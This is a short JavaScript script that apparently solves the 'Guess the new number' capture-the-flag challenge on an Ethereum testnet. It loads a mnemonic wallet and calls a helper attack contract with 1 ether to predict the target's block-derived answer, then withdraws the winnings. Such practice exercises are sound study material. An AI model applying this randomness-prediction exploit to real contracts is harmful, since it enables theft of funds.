const ethers = require('ethers');
const fs = require('fs');
const utils = require('./utils')
const abiFile = './build/contracts/GuessTheNewNumberChallenge.json';
const contractAddressCtf = "./build/contracts/CTFGuessTheNewNumber.json"
const secrteFile = "../.secret"
const mnemonicFile = "../iBpnG3uuUwI.csv"
const ctfContract = "0x3ea487C051D308d235f86F27CC22E9f1Ad648a07"
// 0xDb856EADFB53B71556464fdbB64880EBE5D91F88  0x837097659e7C8C53d7b615CF4fDC81E7d3a2A408
const contractAddress = "0xe576aeE0c08928828B5EE45420B1e21fd9b19506"

let provider = utils.getNetProvider("3")

// use another contract because of can't caculate now by js
async function guess(contractCtf, contractChallange) {
    // get 256 bit at position
    var blockNum = await provider.getBlockNumber()
    console.log("pre block num: " + blockNum)
    let lastAnswer = await contractCtf.lastAnswer()
    console.log("last answer: " + lastAnswer)

    // let craeateInstance = await contractCtf.setGuessMeAddress(contractAddress)
    // console.log("inout address success")
    // // doCapture don't work, must set gas
    let tx = await contractCtf.dontHaveCap({value:ethers.utils.parseEther("1.0")})

    // next block exexute
    let complete = await contractCtf.hasComplete()
    console.log("iscomp  " + complete)
    if (complete) {
        await contractCtf.withDraw()
    }
    
    console.log("guess me done")
}

async function doValue() {

    let wallet = utils.getMnemonicWallet(mnemonicFile)

    let contract = utils.getContract(wallet, contractAddressCtf, ctfContract, provider)
    //let contractChallange = utils.getContract(wallet, abiFile, contractAddress, provider)
    contractChallange = 1

    // console.log(contract)
    await guess(contract, contractChallange)
}


doValue()